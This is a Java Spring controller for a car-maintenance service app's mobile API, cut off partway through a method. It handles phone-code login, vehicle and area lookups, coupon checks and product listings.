package com.hydom.api.action;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;

import org.apache.commons.io.IOUtils;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.servlet.ModelAndView;

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.hydom.account.ebean.Area;
import com.hydom.account.ebean.Comment;
import com.hydom.account.ebean.CommentImg;
import com.hydom.account.ebean.FeeRecord;
import com.hydom.account.ebean.Feedback;
import com.hydom.account.ebean.IndexAdvert;
import com.hydom.account.ebean.Member;
import com.hydom.account.ebean.MemberCoupon;
import com.hydom.account.ebean.MemberRank;
import com.hydom.account.ebean.News;
import com.hydom.account.ebean.NewsRecord;
import com.hydom.account.ebean.Order;
import com.hydom.account.ebean.Parameter;
import com.hydom.account.ebean.Product;
import com.hydom.account.ebean.ProductBrand;
import com.hydom.account.ebean.ProductCategory;
import com.hydom.account.ebean.ProductImage;
import com.hydom.account.ebean.ProductLabel;
import com.hydom.account.ebean.ServerOrder;
import com.hydom.account.ebean.ServerOrderDetail;
import com.hydom.account.ebean.ServiceType;
import com.hydom.account.service.AreaService;
import com.hydom.account.service.CommentImgService;
import com.hydom.account.service.CommentService;
import com.hydom.account.service.FeeRecordService;
import com.hydom.account.service.FeedbackService;
import com.hydom.account.service.IndexAdvertService;
import com.hydom.account.service.MemberCouponService;
import com.hydom.account.service.MemberService;
import com.hydom.account.service.NewsRecordService;
import com.hydom.account.service.NewsService;
import com.hydom.account.service.OrderService;
import com.hydom.account.service.ProductBrandService;
import com.hydom.account.service.ProductCategoryService;
import com.hydom.account.service.ProductService;
import com.hydom.account.service.ServerOrderDetailService;
import com.hydom.account.service.ServerOrderService;
import com.hydom.account.service.ServiceTypeService;
import com.hydom.account.service.SystemParamService;
import com.hydom.account.service.TechnicianService;
import com.hydom.api.ebean.ShortMessage;
import com.hydom.api.ebean.Token;
import com.hydom.api.service.ShortMessageService;
import com.hydom.api.service.TokenService;
import com.hydom.core.server.ebean.Car;
import com.hydom.core.server.ebean.CarBrand;
import com.hydom.core.server.ebean.CarType;
import com.hydom.core.server.ebean.Coupon;
import com.hydom.core.server.ebean.CouponPackage;
import com.hydom.core.server.ebean.CouponPackageRecord;
import com.hydom.core.server.service.CarBrandService;
import com.hydom.core.server.service.CarService;
import com.hydom.core.server.service.CarTypeService;
import com.hydom.core.server.service.CouponPackageRecordService;
import com.hydom.core.server.service.CouponPackageService;
import com.hydom.core.server.service.CouponService;
import com.hydom.core.server.service.FirstSpendSendCouponService;
import com.hydom.user.ebean.UserCar;
import com.hydom.user.service.UserCarService;
import com.hydom.util.CommonAttributes;
import com.hydom.util.CommonUtil;
import com.hydom.util.CouponUseExcepton;
import com.hydom.util.DateTimeHelper;
import com.hydom.util.IDGenerator;
import com.hydom.util.PushUtil;
import com.hydom.util.UploadImageUtil;
import com.hydom.util.dao.PageView;
import com.hydom.util.payUtil.UnionPayUtil;
import com.hydom.util.payUtil.WeChatPayUtil;

@RequestMapping("/api")
@Controller
public class AppServer {
	@Resource
	private MemberService memberService;
	@Resource
	private ShortMessageService shortMessageService;
	@Resource
	private TokenService tokenService;
	@Resource
	private ServiceTypeService serviceTypeService;
	@Resource
	private CarBrandService carBrandService;
	@Resource
	private CarTypeService carTypeService;
	@Resource
	private AreaService areaService;
	@Resource
	private OrderService orderService;
	@Resource
	private CarService carService;
	@Resource
	private UserCarService userCarService;
	@Resource
	private ProductBrandService productBrandService;
	@Resource
	private ProductCategoryService productCategoryService;
	@Resource
	private ProductService productService;
	@Resource
	private NewsService newsService;
	@Resource
	private FeedbackService feedbackService;
	@Resource
	private IndexAdvertService indexAdvertService;
	@Resource
	private MemberCouponService memberCouponService;
	@Resource
	private CouponService couponService;
	@Resource
	private ServerOrderService serverOrderService;
	@Resource
	private ServerOrderDetailService serverOrderDetailService;
	@Resource
	private CommentService commentService;
	@Resource
	private CommentImgService commentImgService;
	@Resource
	private FeeRecordService feeRecordService;
	@Resource
	private SystemParamService systemParamService;
	@Resource
	private TechnicianService technicianService;
	@Resource
	private NewsRecordService newsRecordService;
	@Resource
	private CouponPackageService couponPackageService;
	@Resource
	private CouponPackageRecordService couponPackageRecordService;
	@Resource
	private FirstSpendSendCouponService firstSpendSendCouponService;

	@Autowired
	private HttpServletRequest request;

	private Log log = LogFactory.getLog("dataServerLog");
	private ObjectMapper mapper = new ObjectMapper();

	public AppServer() {
		mapper.getSerializerProvider().setNullValueSerializer(
				new JsonSerializer<Object>() {
					@Override
					public void serialize(Object value, JsonGenerator jg,
							SerializerProvider sp) throws IOException,
							JsonProcessingException {
						jg.writeString("");
					}
				});
	}

	/**
	 * 注册登录
	 */
	@RequestMapping("/user/signin")
	public @ResponseBody
	String userSignin(String phone, String code) {
		try {
			log.info("App【用户登录】：" + "手机号=" + phone + " 验证码=" + code);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			// step1：验证码合法性验证
			ShortMessage shortMessage = shortMessageService.findByPhoneAndCode(
					phone, code, 1);
			if (shortMessage == null) {
				dataMap.put("result", "601"); // 验证码错误
				dataMap.put("uid", "");
				dataMap.put("token", "");
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}
			if (System.currentTimeMillis()
					- shortMessage.getCreateDate().getTime() > 5 * 60 * 1000) {
				dataMap.put("result", "602"); // 验证码过期
				dataMap.put("uid", "");
				dataMap.put("token", "");
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}
			// step2：进行注册或登录
			Member member = memberService.findByMobile(phone);
			if (member == null) { // 为空，则进行注册
				member = new Member();
				member.setMobile(phone);
				memberService.save(member);
			} else if (!member.getVisible() || member.getStatus() == 0) {// 帐号被停用
				dataMap.put("result", "101");// 帐号被停用
				dataMap.put("uid", "");
				dataMap.put("token", "");
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}
			// step3：产生安全令牌-->获取上次的令牌环
			Token token = new Token();
			token.setId(IDGenerator.uuid());
			token.setAuthid(IDGenerator.uuid());
			token.setCreateDate(new Date());
			token.setUid(member.getId());
			tokenService.save(token);

			dataMap.put("result", "001");
			dataMap.put("uid", member.getId());
			dataMap.put("token", token.getAuthid());
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 退出登录
	 */
	@RequestMapping("/user/signout")
	public @ResponseBody
	String userSignout(String uid, String token) {
		try {
			log.info("App【用户退出登录】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			Token tk = tokenService.findToken(uid, token);
			if (token != null) {
				tokenService.delete(tk.getId());
			}
			dataMap.put("result", "001");
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取服务类型
	 */
	@RequestMapping(value = "/server/category", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverCategory(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取服务类型】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 服务类型 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("type", "desc");// 使得上门洗车和上门保养排前
			orderby.put("order", "asc");
			StringBuffer jpql = new StringBuffer("o.visible=?1");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<ServiceType> types = serviceTypeService.getScrollData(0, 10,
					jpql.toString(), params.toArray(), orderby).getResultList();
			for (ServiceType type : types) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("scid", type.getId());
				map.put("scname", type.getName());
				map.put("scimage", type.getImgPath());
				map.put("scremark", type.getRemark());
				map.put("scremark1", type.getRemark1());
				map.put("scremark2", type.getRemark2());
				map.put("scprice", type.getPrice());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取服务时保养类型
	 */
	@RequestMapping(value = "/server/maintenance", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverMaintenance(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取服务保养类型】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 服务类型 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("order", "asc");
			StringBuffer jpql = new StringBuffer("o.visible=?1 and o.type=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(1);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<ServiceType> types = serviceTypeService.getScrollData(
					jpql.toString(), params.toArray(), orderby).getResultList();
			for (ServiceType type : types) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("scid", type.getId());
				map.put("scname", type.getName());
				map.put("scimage", type.getImgPath());
				map.put("scremark", type.getRemark());
				map.put("scremark1", type.getRemark1());
				map.put("scremark2", type.getRemark2());
				map.put("scprice", type.getPrice());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取车辆品牌信息
	 */
	@RequestMapping(value = "/server/carbrand", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverCarbrand(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取车辆品牌信息】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 车辆品牌 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("initial", "asc");
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer("o.visible=?1");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<CarBrand> brands = carBrandService.getScrollData(
					jpql.toString(), params.toArray(), orderby).getResultList();
			for (CarBrand brand : brands) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("cbid", brand.getId());
				map.put("cbname", brand.getName());
				map.put("fletter", brand.getInitial());
				map.put("cbimage", brand.getImgPath());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取车系信息
	 */
	@RequestMapping(value = "/server/carseries", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverCarSeries(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, String cbid) {
		try {
			log.info("App【获取车系信息】：" + "uid=" + uid + " token=" + token
					+ " 品牌cbid=" + cbid);
			new MappingJackson2HttpMessageConverter();
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 顶级车系 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.level=?2 and o.carBrand.id=?3");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(1);
			params.add(cbid);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<CarType> topCarTypes = carTypeService.getScrollData(
					jpql.toString(), params.toArray(), orderby).getResultList();
			for (CarType topCarType : topCarTypes) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("topname", topCarType.getName());
				// 获取顶级车系下的子车系
				List<CarType> types = carTypeService.listByTopID(topCarType
						.getId());
				List<Map<String, Object>> csList = new ArrayList<Map<String, Object>>();
				for (CarType type : types) {
					Map<String, Object> ctMap = new LinkedHashMap<String, Object>();
					ctMap.put("csid", type.getId());
					ctMap.put("csname", type.getName());
					csList.add(ctMap);
				}
				map.put("cslist", csList);
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取车型信息
	 */
	@RequestMapping(value = "/server/carmodel", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverCarmodel(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, String csid) {
		try {
			log.info("App【获取车型信息】：" + "uid=" + uid + " token=" + token
					+ " 车系csid=" + csid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 车型 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.carType.id=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(csid);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<Car> cars = carService.getScrollData(jpql.toString(),
					params.toArray(), orderby).getResultList();
			for (Car car : cars) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("cmid", car.getId());
				map.put("cmname", car.getName());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取贵阳市 下属所有区信息列表
	 * 
	 * @param uid
	 * @param sid
	 * @param scid
	 * @return
	 */
	@Deprecated
	@RequestMapping(value = "/server/arealist", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverArealist(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取贵阳市 下属地区信息】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 区信息 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.parent.name=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add("贵阳市");// 待进一步确定
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<Area> areas = areaService.getScrollData(jpql.toString(),
					params.toArray(), orderby).getResultList();
			for (Area area : areas) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("aid", area.getId());
				map.put("name", area.getName());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	@Deprecated
	@RequestMapping(value = "/server/streetlist", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverStreetlist(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, String aid) {
		try {
			log.info("App【获取贵阳市 下属地区信息】：" + "uid=" + uid + " token=" + token
					+ " 区ID=" + aid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 区信息 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.parent.id=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(aid);// 待进一步确定
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<Area> areas = areaService.getScrollData(jpql.toString(),
					params.toArray(), orderby).getResultList();
			for (Area area : areas) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("sid", area.getId());
				map.put("name", area.getName());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	@RequestMapping(value = "/server/area/top/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverAreaTopList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取顶级地区信息】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 区信息 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.parent is null");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<Area> areas = areaService.getScrollData(jpql.toString(),
					params.toArray(), orderby).getResultList();
			for (Area area : areas) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("aid", area.getId());
				map.put("name", area.getName());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	@RequestMapping(value = "/server/area/child/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverAreaChildList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, String aid) {
		try {
			log.info("App【获取 下属地区信息】：" + "uid=" + uid + " token=" + token
					+ " 区ID=" + aid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 区信息 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.parent.id=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(aid);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<Area> areas = areaService.getScrollData(jpql.toString(),
					params.toArray(), orderby).getResultList();
			for (Area area : areas) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("aid", area.getId());
				map.put("name", area.getName());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 查询是否有空闲的技师
	 * 
	 * @param uid
	 * @param token
	 * @param scid
	 * @param bid
	 * @param pcid
	 * @param cmid
	 * @return
	 */
	@RequestMapping(value = "/server/technician", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverTechnician(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【查询是否有空闲技师】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			dataMap.put("result", "001");
			dataMap.put("canserver", technicianService.isFree() ? 1 : 0);// 暂时设定为1
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	@RequestMapping(value = "/server/date", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverDate(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【查询是否有空闲技师】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
			Calendar calendar = Calendar.getInstance();
			int hour = calendar.get(Calendar.HOUR_OF_DAY);
			Date now = new Date();
			if (hour >= 16) { // 16:00以后
				Date thirdDay = DateTimeHelper.addDays(now, 2);
				dataMap.put("result", "001");
				dataMap.put("date", sdf.format(thirdDay));
				String json = mapper.writeValueAsString(dataMap);
				return json;
			} else {
				Date secondDay = DateTimeHelper.addDays(now, 1);
				dataMap.put("result", "001");
				dataMap.put("date", sdf.format(secondDay));
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取纯保养价格
	 * 
	 * @param uid
	 * @param token
	 * @return
	 */
	@RequestMapping(value = "/server/puremaintenance/price", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverPuremaintenancePprice(
			@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取纯保养价格】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			dataMap.put("result", "001");
			dataMap.put("price", CommonAttributes.getInstance().getSystemBean()
					.getPrice());
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 是否有可用的优惠券
	 */
	@RequestMapping(value = "server/coupon", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverCoupon(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, double money,
			@RequestParam(required = false) String pid, int otype) {
		try {
			log.info("App【判断是否有可用的优惠券】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			String[] pids = null;
			if (pid != null && !"".equals(pid)) {
				pids = pid.split("#");
			}
			dataMap.put("result", "001");
			dataMap.put("usable", memberCouponService.canUse(money, uid, pids,
					otype, 1) ? 1 : 0);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 是否有可用的优惠券
	 */
	@RequestMapping(value = "server/coupon/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String serverCouponList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, double money,
			@RequestParam(required = false) String pid, int otype) {
		try {
			log.info("App【判断是否有可用的优惠券】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			String[] pids = null;
			if (pid != null && !"".equals(pid)) {
				pids = pid.split("#");
			}
			dataMap.put("result", "001");
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<MemberCoupon> mcList = memberCouponService.canUseList(money,
					uid, pids, otype, 1);
			if (mcList != null && mcList.size() > 0) {
				for (MemberCoupon mc : mcList) {
					Map<String, Object> map = new LinkedHashMap<String, Object>();
					map.put("cpid", mc.getId());
					map.put("cptype", mc.getType());
					map.put("cpname", mc.getName());
					map.put("cpintroduction", mc.getIntroduction());
					map.put("cpimg", mc.getImgPath());
					if (mc.getType() == 1) {// 1=满额打折
						map.put("cpminprice", mc.getMinPrice() + "");
						map.put("cprate", mc.getRate() + "");
						map.put("cpmoney", "");
					} else if (mc.getType() == 2) {// 2=满额减免
						map.put("cpminprice", mc.getMinPrice() + "");
						map.put("cprate", "");
						map.put("cpmoney", mc.getDiscount());

					} else if (mc.getType() == 3) {// 3=免额多少
						map.put("cpminprice", "");
						map.put("cprate", "");
						map.put("cpmoney", mc.getDiscount());
					}
					list.add(map);
				}
			}
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取商品品牌
	 * 
	 */
	@RequestMapping(value = "/product/brand", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productBrand(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token,
			@RequestParam(required = false) String scid) {
		try {
			log.info("App【获取商品品牌】：" + "uid=" + uid + " token=" + token
					+ " scid=" + scid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer("o.visible=?1");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			List<ProductBrand> brands = productBrandService.getScrollData(
					jpql.toString(), params.toArray(), orderby).getResultList();

			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (ProductBrand brand : brands) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("bid", brand.getId());
				map.put("bname", brand.getName());
				map.put("bimage", brand.getImgPath());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 根据服务类型 获取商品类型
	 * 
	 */
	@RequestMapping(value = "/product/category", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productCategory(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, String scid) {
		try {
			log.info("App【获取商品类型】：" + "uid=" + uid + " token=" + token
					+ " scid=" + scid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.serviceType.id=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(scid);
			List<ProductCategory> categorys = productCategoryService
					.getScrollData(jpql.toString(), params.toArray(), orderby)
					.getResultList();

			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (ProductCategory pc : categorys) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("pcid", pc.getId());
				map.put("pcame", pc.getName());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 根据车型和服务类型 获取默认商品
	 * 
	 */
	@RequestMapping(value = "/product/default", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productDefault(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, String scid,
			String cmid) {
		try {
			log.info("App【获取商品类型】：" + "uid=" + uid + " token=" + token
					+ " scid=" + scid + " cmid=" + cmid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			String[] sids = scid.split("#");
			for (String sid : sids) {
				Product product = productService.defaultForServer(sid, cmid);
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				if (product != null) {
					map.put("scid", sid);
					map.put("pid", product.getId());
					map.put("pname", product.getName());
					map.put("pimage", product.getImgPath());
					map.put("pbuynum", product.getBuyProductCount());// 商品购买数
					if (product.getProuductUniqueType() != null
							&& product.getProuductUniqueType() == 3) {// 天天特价
						map.put("price", product.getDiscountMoney());
					} else {
						map.put("price", product.getMarketPrice());
					}
					map.put("pcomts",
							commentService.countByPid(product.getId()));
					list.add(map);
				} else {
					// map.put("scid", sid);
					// map.put("pid", "");
					// map.put("pname", "");
					// map.put("pimage", "");
					// map.put("pbuynum", 0);
					// map.put("price", 0);
					// map.put("pcomts", 0);
				}
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取商品列表 已选商品pids字串集(以#分隔)
	 */
	@RequestMapping(value = "/product/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, String scid,
			String cmid, @RequestParam(required = false) String pids, int page,
			int maxresult) {
		try {
			log.info("App【获取商品列表】：" + "uid=" + uid + " token=" + token
					+ " scid=" + scid + " cmid=" + cmid + " pids =" + pids);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			String[] pid = null;
			if (pids != null && !"".equals(pids)) {
				pid = pids.split("#");
			}
			PageView<Product> pageView = new PageView<Product>(maxresult, page);
			pageView.setTotalrecord(productService.countForServer(scid, cmid,
					pid));
			pageView.setRecords(productService.listForServer(scid, cmid,
					pageView.getFirstResult(), maxresult, pid));

